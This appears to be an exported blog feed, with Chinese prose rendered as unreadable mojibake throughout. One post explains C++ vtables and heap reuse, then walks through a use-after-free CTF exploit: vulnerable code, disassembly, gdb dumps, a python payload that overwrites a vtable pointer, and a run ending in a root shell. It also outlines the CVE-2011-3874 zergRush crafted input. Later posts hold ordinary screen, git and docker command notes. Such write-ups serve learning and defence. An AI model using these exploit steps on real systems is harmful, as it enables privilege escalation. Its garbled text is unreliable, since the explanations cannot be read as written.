<p>åœ¨C++ä¸­ï¼Œå¦‚æœç±»ä¸­æœ‰è™šå‡½æ•°ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šæœ‰ä¸€ä¸ªè™šå‡½æ•°è¡¨çš„æŒ‡é’ˆ__vfptrï¼Œåœ¨ç±»å¯¹è±¡æœ€å¼€å§‹çš„å†…å­˜æ•°æ®ä¸­ã€‚ä¹‹åæ˜¯ç±»ä¸­çš„æˆå‘˜å˜é‡çš„å†…å­˜æ•°æ®ï¼Œè™šå‡½æ•°æŒ‡é’ˆæŒ‡å‘è™šå‡½æ•°è¡¨</p>
<p>å¯¹äºå­ç±»ï¼Œæœ€å¼€å§‹çš„å†…å­˜æ•°æ®è®°å½•ç€çˆ¶ç±»å¯¹è±¡çš„æ‹·è´ï¼ˆåŒ…æ‹¬çˆ¶ç±»è™šå‡½æ•°è¡¨æŒ‡é’ˆå’Œæˆå‘˜å˜é‡ï¼‰ã€‚ ä¹‹åæ˜¯å­ç±»è‡ªå·±çš„æˆå‘˜å˜é‡æ•°æ®</p>
<pre><code class="language-c">#include &lt;iostream&gt;
class A{
public:
    int a;
    A():a(0x1) {}
    virtual void foo(){ std::cout &lt;&lt; &quot;A::foo()&quot; &lt;&lt; std::endl; }
    void bar(){ std::cout &lt;&lt; &quot;A::bar()&quot; &lt;&lt; std::endl; }
};
class B: public A{
public:
    int b;
    B():A(),b(0x2) {}
    void foo(){ std::cout &lt;&lt; &quot;B::foo()&quot; &lt;&lt; std::endl; }
};
class C: public B{
public:
    int c;
    C():B(),c(0x3) {}
    void foo(){ std::cout &lt;&lt; &quot;C::foo()&quot; &lt;&lt; std::endl; }
};
int main() {
    A a; B b; C c; B *p = &amp;c;
    p-&gt;foo();
    std::cout &lt;&lt; sizeof(int) &lt;&lt; &quot; &quot; &lt;&lt; sizeof(int*) &lt;&lt; std::endl;
    return 0;
}
</code></pre>
<pre><code>(gdb) p a
$1 = {_vptr.A = 0x555555557d90 &lt;vtable for A+16&gt;, a = 1}
(gdb) p b
$2 = {&lt;A&gt; = {_vptr.A = 0x555555557d78 &lt;vtable for B+16&gt;, a = 1}, b = 2}
(gdb) p c
$3 = {&lt;B&gt; = {&lt;A&gt; = {_vptr.A = 0x555555557d60 &lt;vtable for C+16&gt;, a = 1},
    b = 2}, c = 3}

</code></pre>
<h3 id="slab-slub">SLAB &amp;&amp; SLUB</h3>
<p>å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒSLABè¦æ±‚ç³»ç»Ÿæš‚æ—¶ä¿ç•™å·²ç»é‡Šæ”¾çš„å†…æ ¸å¯¹è±¡ç©ºé—´ï¼Œä»¥ä¾¿ä¸‹æ¬¡ç”³è¯·æ—¶ä¸éœ€è¦å†æ¬¡åˆå§‹åŒ–å’Œåˆ†é…;ä½†æ˜¯ï¼ŒSLABæœºåˆ¶å¯¹å†…æ ¸å¯¹è±¡çš„ç±»å‹ååˆ†æŒ‘å‰”ï¼Œåªæœ‰ç±»å‹å’Œå¤§å°éƒ½å®Œå…¨ä¸€è‡´çš„å¯¹è±¡æ‰èƒ½é‡ç”¨å…¶ç©ºé—´;è¿™å°±å¥½æ¯”æ˜¯è£…è¿‡é¸¡çš„ç¬¼å­æ˜¯ä¸å…è®¸å†å»å…³å…”å­äº†,å“ªæ€•é¸¡å’Œå…”å­çš„å¤§å°ä¸€æ ·;<br>
ä½†æ˜¯,å’ŒSLABç›¸æ¯”,SLUBå¯¹å¯¹è±¡ç±»å‹å°±æ²¡æœ‰é™åˆ¶,ä¸¤ä¸ªå¯¹è±¡åªè¦å¤§å°å·®ä¸å¤šå°±å¯ä»¥é‡ç”¨åŒä¸€å—å†…å­˜,è€Œä¸åœ¨ä¹ç±»å‹æ˜¯å¦ç›¸åŒ;</p>
<p>ç¤ºä¾‹ä»£ç </p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
int main()
{
    char *p1;
    p1 = (char *) malloc(sizeof(char)*10);
    memcpy(p1,&quot;hello&quot;,10);
    printf(&quot;p1 addr:%x,%s\n&quot;,p1,p1);
    free(p1);
    char *p2;
    p2 = (char *)malloc(sizeof(char)*10); //ç”³è¯·åŒæ ·å¤§å°çš„å†…å­˜
    memcpy(p1,&quot;world&quot;,10); //å‘p1ä¸­æ‹·è´ 
    printf(&quot;p2 addr:%x,%s\n&quot;,p2,p2);// è¾“å‡ºp2
    return 0;
}
</code></pre>
<p>è¾“å‡º</p>
<pre><code>p1 addr:d21260,hello
p2 addr:d21260,world

</code></pre>
<h3 id="ctf-ç¤ºä¾‹">CTF-ç¤ºä¾‹</h3>
<pre><code class="language-c">#include &lt;fcntl.h&gt;
#include &lt;iostream&gt;
#include &lt;cstring&gt;
#include &lt;cstdlib&gt;
#include &lt;unistd.h&gt;
using namespace std;

class Human{
private:
	virtual void give_shell(){
		 system(&quot;/bin/sh&quot;);
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;
		cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;
	}
};
class Man: public Human{
public:
        Man(string name, int age){
                this-&gt;name = name;
                this-&gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&gt;name = name;
                this-&gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man(&quot;Jack&quot;, 25);
        Human* w = new Woman(&quot;Jill&quot;, 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
                cin &gt;&gt; op;

                switch(op){
                        case 1:
                                m-&gt;introduce();
                                w-&gt;introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
</code></pre>
<p>æœ‰ä¸‰ä¸ªç±»ï¼ŒManå’ŒWomanéƒ½æ˜¯ç»§æ‰¿äº†Humanç±»ï¼Œå¹¶ä¸”å¯ä»¥çœ‹å‡ºåªè¦æˆ‘ä»¬å°†æ§åˆ¶æµåŠ«æŒåˆ°Humanç±»çš„ç§æœ‰è™šå‡½æ•°give_shellï¼Œå°±èƒ½getshelläº†ã€‚</p>
<p>å¯ä»¥æ ¹æ®ä»£ç çœ‹å‡ºæ¥ï¼Œè¦æƒ³åˆ©ç”¨UAFï¼Œå°±è¦å…ˆé€‰freeï¼Œç„¶åafterï¼Œå†useã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆè¦çœ‹ä¸‹è¦ç”³è¯·å¤šå¤§çš„å†…å­˜ç©ºé—´åˆé€‚ï¼Œå¯ä»¥æŠŠè¿™ä¸ªä»£ç ç¼–è¯‘ä¸€ä¸‹ï¼Œä¹‹åç”¨IDAåæ±‡ç¼–çœ‹ä¸‹ä¼ªä»£ç ,å¯ä»¥çœ‹åˆ°éœ€è¦0x30ï¼Œå°±æ˜¯48çš„å†…å­˜ã€‚è¿™ä¸ªç»“æœä¼šå› ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨çš„ç³»ç»Ÿä¸åŒå­˜åœ¨å·®å¼‚ï¼Œè¿™ä¸ªCTFé¢˜åŸæœ¬ç»™çš„ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºåæ±‡ç¼–å°±æ˜¯0x18çš„ï¼Œæ˜¯24</p>
<pre><code class="language-c++">  v3 = (Man *)operator new(0x30uLL);
  Man::Man(v3, &amp;p_name, 25);
  m = v3;
</code></pre>
<p>ä¹Ÿå¯ä»¥ç”¨gdbè°ƒè¯•çœ‹åˆ°å¤§å°æ˜¯48</p>
<pre><code class="language-shell">Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54
54                      cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
(gdb) p *m
$1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;}
(gdb) p sizeof(*m)
$2 = 48

</code></pre>
<p>ç„¶åæ‰¾åˆ°introduceè°ƒç”¨çš„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æ ¹æ®è™šå‡½æ•°æŒ‡é’ˆï¼Œç„¶å+1è°ƒç”¨åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ˜¯æƒ³è°ƒç”¨åˆ°given_shell å°±æ˜¯è¦è¦†ç›–æ”¹å†™è™šå‡½æ•°æŒ‡é’ˆçš„å€¼</p>
<pre><code>          (*((void (__fastcall **)(Human *))m-&gt;_vptr_Human + 1))(m);
          (*((void (__fastcall **)(Human *))w-&gt;_vptr_Human + 1))(w);
</code></pre>
<p>ç„¶åå¯»æ‰¾man è™šå‡½æ•°è¡¨ã€‚æ‰¾åˆ°mançš„æ„é€ å‡½æ•°</p>
<pre><code class="language-c++">void __cdecl Man::Man(Man *const this, std::string *p_name, int age)
{
  Human::Human(this);
  this-&gt;_vptr_Human = (int (**)(...))&amp;off_403D80;
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;this-&gt;name, p_name);
  this-&gt;age = age;
}
</code></pre>
<p>è·Ÿè¿›_vptr_Humançš„off_403D80å¤„ï¼Œå¯ä»¥çœ‹åˆ°mançš„è™šå‡½æ•°è¡¨</p>
<pre><code class="language-c++">.data.rel.ro:0000000000403D70 ; `vtable for'Man
.data.rel.ro:0000000000403D70 _ZTV3Man        dq 0                    ; offset to this
.data.rel.ro:0000000000403D78                 dq offset _ZTI3Man      ; `typeinfo for'Man
.data.rel.ro:0000000000403D80 off_403D80      dq offset _ZN5Human10give_shellEv
.data.rel.ro:0000000000403D80                                         ; DATA XREF: Man::Man(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+20â†‘o
.data.rel.ro:0000000000403D80                                         ; Human::give_shell(void)
.data.rel.ro:0000000000403D88                 dq offset _ZN3Man9introduceEv ; Man::introduce(void)
.data.rel.ro:0000000000403D90                 public _ZTV5Human ; weak
.data.rel.ro:0000000000403D90 ; `vtable for'Human
.data.rel.ro:0000000000403D90 _ZTV5Human      dq 0                    ; offset to this
.data.rel.ro:0000000000403D98                 dq offset _ZTI5Human    ; `typeinfo for'Human
.data.rel.ro:0000000000403DA0 off_403DA0      dq offset _ZN5Human10give_shellEv
.data.rel.ro:0000000000403DA0                                         ; DATA XREF: Human::Human(void)+Câ†‘o
.data.rel.ro:0000000000403DA0                                         ; Human::~Human()+Câ†‘o
.data.rel.ro:0000000000403DA0                                         ; Human::give_shell(void)
.data.rel.ro:0000000000403DA8                 dq offset _ZN5Human9introduceEv ; Human::introduce(void)
.data.rel.ro:0000000000403DB0 ; public Woman :
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè™šå‡½æ•°è¡¨ä¸­<strong>0x0000000000403D80</strong>åœ°å€å°±æ˜¯manè™šå‡½æ•°æŒ‡é’ˆçš„å€¼ï¼Œè€Œm-&gt;introduce()è°ƒç”¨æ—¶ï¼Œè°ƒç”¨çš„å…¶å®æ˜¯<code>0x0000000000403D80+0x8=0000000000403D88</code> ï¼Œ<code>_vptr_Human</code>ä¸ŠåŠ äº†0x8è°ƒç”¨åˆ°äº†introduceã€‚æˆ‘ä»¬æƒ³è¦è®©ä»–è°ƒç”¨åˆ°give_shellå°±åªéœ€è¦å°†<code>_vptr_Human</code>çš„å€¼è¦†ç›–ä¸º<code>0x0000000000403D80-0x8=0x0000000000403D78</code></p>
<p>è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥é€šè¿‡gdbè°ƒè¯•çœ‹åˆ°ï¼Œæ‰“æ–­ç‚¹ä¹‹å<code>info vtbl *m</code>å°±èƒ½çœ‹åˆ°å¯¹ç”¨çš„è™šå‡½æ•°çš„è¡¨ï¼Œæˆ–è€…ç›´æ¥æŸ¥çœ‹å˜é‡ç»“æ„ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ ¹æ®mçš„æŒ‡é’ˆå€¼ï¼Œçœ‹ä¸‹mançš„å†…å­˜ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€å—æ”¾çš„å°±æ˜¯è™šå‡½æ•°çš„æŒ‡é’ˆ<code>0x00403d80</code></p>
<pre><code class="language-shell">Starting program: /home/kali/uaf/uaf
\
Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54
54                      cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
(gdb) p *m
$1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;}
(gdb) info vtbl *m
vtable for 'Human' @ 0x403d80 (subobject @ 0x416eb0):
[0]: 0x40157e &lt;Human::give_shell()&gt;
[1]: 0x401700 &lt;Man::introduce()&gt;
(gdb) x /10 0x403d80
0x403d80 &lt;_ZTV3Man+16&gt;: 0x000000000040157e      0x0000000000401700
0x403d90 &lt;_ZTV5Human&gt;:  0x0000000000000000      0x0000000000403de0
0x403da0 &lt;_ZTV5Human+16&gt;:       0x000000000040157e      0x000000000040159a
0x403db0 &lt;_ZTI5Woman&gt;:  0x00007ffff7fa6c98      0x0000000000402087
0x403dc0 &lt;_ZTI5Woman+16&gt;:       0x0000000000403de0      0x00007ffff7fa6c98
(gdb) p m
$3 = (Human *) 0x416eb0
(gdb) x /10x 0x416eb0
0x416eb0:       0x00403d80      0x00000000      0x00000019      0x00000000
0x416ec0:       0x00416ed0      0x00000000      0x00000004      0x00000000
0x416ed0:       0x6b63614a      0x00000000
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»ç¡®è®¤äº†</p>
<ol>
<li>
<p>éœ€è¦48çš„ç©ºé—´</p>
</li>
<li>
<p>éœ€è¦æŠŠ<code>_vptr_Human</code> çš„å€¼è¦†ç›–ä¸º<code>0x0000000000403D78</code></p>
</li>
</ol>
<p>ç„¶åå°è¯•ä¸€ä¸‹</p>
<pre><code class="language-shell">root@kali:/home/kali/uaf# python -c &quot;print('\x78\x3d\x40\x00\x00\x00\x00\x00')&quot; &gt; poc
root@kali:/home/kali/uaf# ./uaf 48 poc
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>æ³¨æ„äº‹é¡¹ï¼šå¤ç°çš„æ—¶å€™è‡ªå·±ç¼–è¯‘è¦æ³¨æ„å…³æ‰PIE,ä¸ç„¶åœ°å€ä¼šè¢«éšæœºåŒ–å¤„ç†ï¼Œåªæœ‰ä½ä¸¤ä½å›ºå®š</p>
<p><code>g++ uaf.cpp -o uaf -g -no-pie</code></p>
<h3 id="cve-2011-3874-zergrush">CVE-2011-3874-zergRush</h3>
<p>å®‰å“UAFæ¼æ´ï¼Œé€šè¿‡ç¼“å†²åŒºæº¢å‡ºï¼Œæ§åˆ¶freeä»»æ„åœ°å€</p>
<p>ä»£ç æ•´ä¸ªæµç¨‹å°±æ˜¯ä»dataä¸­è¯»å–æ•°æ®æ”¾å…¥tmpä¸­ï¼Œä»¥ç©ºæ ¼ä¸ºåˆ†å‰²ï¼Œç„¶åï¼Œè°ƒç”¨<code>strdup</code>ç”³è¯·å†…å­˜å¤åˆ¶tmpä¸­å†…å®¹ï¼Œå°†æŒ‡é’ˆæ”¾å…¥argvæ•°ç»„ä¸­ï¼Œç„¶åå†å¯¹argvä¸­æ¯ä¸ªæŒ‡é’ˆè¿›è¡Œfreeæ“ä½œã€‚</p>
<pre><code class="language-c++">void FrameworkListener::dispatchCommand(SocketClient *cli, char *data) {      
    FrameworkCommandCollection::iterator i;                                   
    int argc = 0;                                                             
    char *argv[FrameworkListener::CMD_ARGS_MAX];                              
    char tmp[255];                                                            
    char *p = data;                                                           
    char *q = tmp;                                                            
    bool esc = false;                                                         
    bool quote = false;                                                       
    int k;                                                                    

    memset(argv, 0, sizeof(argv));                                            
    memset(tmp, 0, sizeof(tmp));                                              
    while(*p) {                                                               
        ...  

        *q = *p++; 
        //å‚æ•°æˆªå–åˆ†æ”¯                                                          
        if (!quote &amp;&amp; *q == ' ') {                                           
            *q = '\0';                                                       
            argv[argc++] = strdup(tmp);                                      
            memset(tmp, 0, sizeof(tmp));                                     
            q = tmp;                                                         
            continue;                                                        
        }                                                                    
        q++;                                                                 
    }                                                                        

    argv[argc++] = strdup(tmp);                                              
    ....                                                                           
    int j;                                                                   
    for (j = 0; j &lt; argc; j++)                                               
        free(argv[j]);                                                       
    return;
} 
</code></pre>
<p>éœ€è¦å…³æ³¨ä¸€ç‚¹ï¼Œå­—ç¬¦æŒ‡é’ˆæ•°ç»„argvæ˜¯å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„ï¼Œé•¿åº¦æ˜¯16ã€‚</p>
<p>æ„é€ è¾“å…¥ <code>cmd p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 \x78\x56\x34\x12</code> å¯ä»¥å®ç°freeæ‰ <code>0x12345678</code>å¤„çš„å†…å­˜</p>
<p>åˆ©ç”¨æº¢å‡ºfreeä»»æ„åœ°å€æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Œå…³é”®å°±æ˜¯ä»argvæº¢å‡ºåˆ°tmp</p>
<p>åœ¨å¾ªç¯ä¸æ–­å­˜å…¥p15ä¹‹åï¼Œargvå·²ç»æ»¡äº†ï¼Œä¹‹åè¯»å…¥p16ï¼Œä¼šå°†p16çš„æŒ‡é’ˆå­˜å…¥tmp[0] - tmp[3]ï¼Œä¹‹åç»§ç»­è¯»å…¥æˆ‘ä»¬æ„é€ çš„åœ°å€</p>
<p>é¦–å…ˆï¼Œä¼šå°†åœ°å€å­˜å…¥tmpä¸­ï¼Œä¼šè¦†ç›–æ‰tmp[0] - tmp[3]ï¼Œä¹Ÿå°±æ˜¯å°†argv[16]å­˜æ”¾çš„æŒ‡é’ˆåœ°å€ç»™è¦†ç›–æ‰äº†ï¼Œä¹‹åå†å°†æ­¤å—æ•°æ®ç”³è¯·ä¸€å—å†…å­˜ï¼ŒæŠŠæŒ‡é’ˆç»™argv[17],å…¶å®ä¹Ÿæ˜¯tmpçš„tmp[4] - tmp[7]</p>
<p>ä¹‹åå¾ªç¯freeçš„æ—¶å€™ï¼Œåœ¨free[argv[16]]çš„æ—¶å€™å°±ä¼šfreeæ‰æˆ‘ä»¬å†™å…¥çš„ç‰¹å®šåœ°å€<br>
<img src="https://rainerhu.github.io/post-images/1687092682484.png" alt="" loading="lazy"><br>
ä¹‹åå†æ¬¡è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰§è¡Œåˆ°strdup(tmp)çš„æ—¶å€™å°±å¯ä»¥åˆ†é…ä¸€å—å¯æ§åˆ¶å¤§å°çš„å†…å­˜ï¼Œå¯ä»¥å°†åˆšæ‰freeæ‰çš„å†…å­˜åˆ†é…åˆ°ï¼Œç„¶åå¯¹è¿™å—å†…å­˜è¿›è¡Œå†™å…¥æ•°æ®ã€‚è¿›è¡Œåç»­çš„åˆ©ç”¨</p>
<h3 id="å°ç»“">å°ç»“</h3>
<ul>
<li>å­˜åœ¨æœ‰æŒ‡é’ˆåœ¨é‡Šæ”¾åè¿˜ä¼šè¢«ç»§ç»­ä½¿ç”¨çš„é€»è¾‘</li>
<li>å¯ä»¥æ§åˆ¶freeæ‰ä»»æ„æŒ‡é’ˆçš„å†…å­˜ï¼Œç„¶åå†ç”³è¯·è¯¥å†…å­˜ï¼Œå†™å…¥æ•°æ®</li>
</ul>
<p>ä¸¤ç§æƒ…å†µéƒ½ä¼šå¯¼è‡´UAFï¼Œç¬¬äºŒç§ä¼šæ¯”è¾ƒå°‘è§ä¹Ÿæ›´åŠ éšè”½ï¼Œä¸€èˆ¬éœ€è¦å…¶ä»–æ¼æ´æ‰èƒ½åšåˆ°</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å‘½ä»¤è®°å½•]]></title>
        <id>https://rainerhu.github.io/post/ming-ling-ji-lu/</id>
        <link href="https://rainerhu.github.io/post/ming-ling-ji-lu/">
        </link>
        <updated>2017-11-23T09:27:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="æ ‘è“æ´¾">æ ‘è“æ´¾</h1>
<ul>
<li>æŸ¥çœ‹æ¸©åº¦</li>
</ul>
<pre><code>vcgencmd measure_temp 
</code></pre>
<h1 id="centos">centos</h1>
<h2 id="é‡å¯ç½‘ç»œ">é‡å¯ç½‘ç»œ</h2>
<pre><code>service network restart
</code></pre>
<h2 id="screen">screen</h2>
<h3 id="å¸¸ç”¨å‘½ä»¤">å¸¸ç”¨å‘½ä»¤:</h3>
<pre><code>screen -S name #åˆ›å»ºä¸€ä¸ªåå­—ä¸ºnameçš„ä¼šè¯
screen -r name #æ¢å¤åˆ°ç¦»å¼€å‰åˆ›å»ºçš„nameä¼šè¯çš„å·¥ä½œç•Œé¢
screen -ls screen #ä¼šåˆ—å‡ºå½“å‰å­˜åœ¨çš„ä¼šè¯åˆ—è¡¨
exit #ä¼šæç¤ºï¼š[screen is terminating]ï¼Œè¡¨ç¤ºå·²ç»æˆåŠŸé€€å‡ºscreenä¼šè¯
</code></pre>
<h3 id="è¿œç¨‹æ¼”ç¤º">è¿œç¨‹æ¼”ç¤º</h3>
<p>é¦–å…ˆæ¼”ç¤ºè€…å…ˆåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ<br>
<code>screen -S test</code> åˆ›å»ºä¸€ä¸ªscreenä¼šè¯ï¼Œ<br>
è§‚ä¼—å¯ä»¥é“¾æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œ<code>screen -x test</code> è§‚ä¼—å±å¹•ä¸Šå°±ä¼šå‡ºç°å’Œæ¼”ç¤ºè€…åŒæ­¥ã€‚</p>
<h1 id="cmder">cmder</h1>
<p>åˆ©ç”¨Tabï¼Œè‡ªåŠ¨è·¯å¾„è¡¥å…¨ï¼›<br>
åˆ©ç”¨Ctrl+Tå»ºç«‹æ–°é¡µç­¾ï¼›åˆ©ç”¨Ctrl+Wå…³é—­é¡µç­¾;<br>
åˆ©ç”¨Ctrl+Tabåˆ‡æ¢é¡µç­¾;<br>
Alt+F4ï¼šå…³é—­æ‰€æœ‰é¡µç­¾<br>
Alt+Shift+1ï¼šå¼€å¯cmd.exe<br>
Alt+Shift+2ï¼šå¼€å¯powershell.exe<br>
Alt+Shift+3ï¼šå¼€å¯powershell.exe (ç³»ç»Ÿç®¡ç†å‘˜æƒé™)<br>
Ctrl+1ï¼šå¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬1ä¸ªé¡µç­¾<br>
Ctrl+nï¼šå¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬nä¸ªé¡µç­¾( nå€¼æ— ä¸Šé™)<br>
Alt + enterï¼š åˆ‡æ¢åˆ°å…¨å±çŠ¶æ€ï¼›<br>
Ctr+r å†å²å‘½ä»¤æœç´¢</p>
<h1 id="git-ä»£ç†">git ä»£ç†</h1>
<pre><code>git config --global --unset http.proxy
git config --global --unset https.proxy
git config --global http.proxy 'socks5://127.0.0.1:1086'   
git config --global https.proxy 'socks5://127.0.0.1:1086'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[dockerå¸¸ç”¨å‘½ä»¤è®°å½•]]></title>
        <id>https://rainerhu.github.io/post/docker-chang-yong-ming-ling-ji-lu/</id>
        <link href="https://rainerhu.github.io/post/docker-chang-yong-ming-ling-ji-lu/">
        </link>
        <updated>2017-11-16T09:31:35.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="åŸºç¡€ç±»">åŸºç¡€ç±»</h1>
<h2 id="æŸ¥çœ‹dockerä¿¡æ¯">æŸ¥çœ‹dockerä¿¡æ¯</h2>
<pre><code># æŸ¥çœ‹dockerç‰ˆæœ¬
docker version
# æ˜¾ç¤ºdockerç³»ç»Ÿçš„ä¿¡æ¯
docker info
# æ—¥å¿—ä¿¡æ¯
docker logs
# æ•…éšœæ£€æŸ¥
service  docker  status
# å¯åŠ¨å…³é—­docker
sudo service docker start|stop
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<h1 id="åŸºç¡€ç±»">åŸºç¡€ç±»</h1>
<h2 id="æŸ¥çœ‹dockerä¿¡æ¯">æŸ¥çœ‹dockerä¿¡æ¯</h2>
<pre><code># æŸ¥çœ‹dockerç‰ˆæœ¬
docker version
# æ˜¾ç¤ºdockerç³»ç»Ÿçš„ä¿¡æ¯
docker info
# æ—¥å¿—ä¿¡æ¯
docker logs
# æ•…éšœæ£€æŸ¥
service  docker  status
# å¯åŠ¨å…³é—­docker
sudo service docker start|stop
</code></pre>
<!-- more -->
<h1 id="æ—¥å¿—ç±»">æ—¥å¿—ç±»</h1>
<h2 id="æŸ¥çœ‹å®¹å™¨æ—¥å¿—">æŸ¥çœ‹å®¹å™¨æ—¥å¿—</h2>
<pre><code>docker logs -f &lt;å®¹å™¨åorID&gt;
</code></pre>
<h2 id="docker-daemon-æ—¥å¿—ä½ç½®">docker daemon æ—¥å¿—ä½ç½®</h2>
<p>æ ¹æ®ç³»ç»Ÿä¸åŒå„ä¸ç›¸åŒ</p>
<pre><code>* Ubuntu - /var/log/upstart/docker.log
* Boot2Docker - /var/log/docker.log
* Debian GNU/Linux - /var/log/daemon.log
* CentOS - /var/log/daemon.log | grep docker
* Fedora - journalctl -u docker.service
* Red Hat Enterprise Linux Server - /var/log/messages | grep docker
</code></pre>
<h2 id="docker-psæ²¡æœ‰å“åº”-æ—¥å¿—æŸ¥è¯¢">docker psæ²¡æœ‰å“åº” æ—¥å¿—æŸ¥è¯¢</h2>
<pre><code># grep æ‰€æœ‰å®¹å™¨çš„config.json
docker logs [conID]
# ç¡®è®¤é—®é¢˜å
# è¯¥config.json ä¸­æœ‰è¯¥å®¹å™¨1å·è¿›ç¨‹çš„pid
kill -9 pid
</code></pre>
<h1 id="å®¹å™¨ç±»">å®¹å™¨ç±»</h1>
<p>dockerå®¹å™¨å¯ä»¥ç†è§£ä¸ºåœ¨æ²™ç›’ä¸­è¿è¡Œçš„è¿›ç¨‹ã€‚</p>
<blockquote>
<p>è¿™ä¸ªæ²™ç›’åŒ…å«äº†è¯¥è¿›ç¨‹è¿è¡Œæ‰€å¿…é¡»çš„èµ„æºï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿã€ç³»ç»Ÿç±»åº“ã€shell ç¯å¢ƒç­‰ç­‰ã€‚ä½†è¿™ä¸ªæ²™ç›’é»˜è®¤æ˜¯ä¸ä¼šè¿è¡Œä»»ä½•ç¨‹åºçš„ã€‚ä½ éœ€è¦åœ¨æ²™ç›’ä¸­è¿è¡Œä¸€ä¸ªè¿›ç¨‹æ¥å¯åŠ¨æŸä¸€ä¸ªå®¹å™¨ã€‚è¿™ä¸ªè¿›ç¨‹æ˜¯è¯¥å®¹å™¨çš„å”¯ä¸€è¿›ç¨‹ï¼Œæ‰€ä»¥å½“è¯¥è¿›ç¨‹ç»“æŸçš„æ—¶å€™ï¼Œå®¹å™¨ä¹Ÿä¼šå®Œå…¨çš„åœæ­¢ã€‚</p>
</blockquote>
<h2 id="æŸ¥çœ‹å®¹å™¨ä¿¡æ¯">æŸ¥çœ‹å®¹å™¨ä¿¡æ¯</h2>
<pre><code># æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨
docker ps
# æŸ¥çœ‹å…¨éƒ¨å®¹å™¨
docker ps -a
# æŸ¥çœ‹å…¨éƒ¨å®¹å™¨çš„idå’Œä¿¡æ¯
docker ps -a -q
# æŸ¥çœ‹ä¸€ä¸ªæ­£åœ¨è¿è¡Œå®¹å™¨è¿›ç¨‹ï¼Œæ”¯æŒ ps å‘½ä»¤å‚æ•°
docker top
# æŸ¥çœ‹å®¹å™¨çš„ç¤ºä¾‹id
sudo docker inspect -f  '{{.Id}}' [id]
# æ£€æŸ¥é•œåƒæˆ–è€…å®¹å™¨çš„å‚æ•°ï¼Œé»˜è®¤è¿”å› JSON æ ¼å¼
docker inspect
# è¿”å› ubuntu:14.04  é•œåƒçš„ docker ç‰ˆæœ¬
docker inspect --format '{{.DockerVersion}}' ubuntu:14.04
</code></pre>
<h2 id="å®¹å™¨åŒæ­¥å‘½ä»¤">å®¹å™¨åŒæ­¥å‘½ä»¤</h2>
<pre><code># ä¿å­˜å¯¹å®¹å™¨çš„ä¿®æ”¹
docker commit
# å¯¹æ¯”å®¹å™¨çš„æ”¹åŠ¨
docker diff
# é™„åŠ åˆ°ä¸€ä¸ªè¿è¡Œçš„å®¹å™¨ä¸Š
docker attach
</code></pre>
<h2 id="å®¹å™¨æ“ä½œå‘½ä»¤">å®¹å™¨æ“ä½œå‘½ä»¤</h2>
<h3 id="åˆ›å»ºåˆ é™¤å®¹å™¨">åˆ›å»ºåˆ é™¤å®¹å™¨</h3>
<pre><code># åˆ›å»ºä¸€ä¸ªå®¹å™¨å‘½åä¸º test ä½¿ç”¨é•œåƒdaocloud.io/library/ubuntu
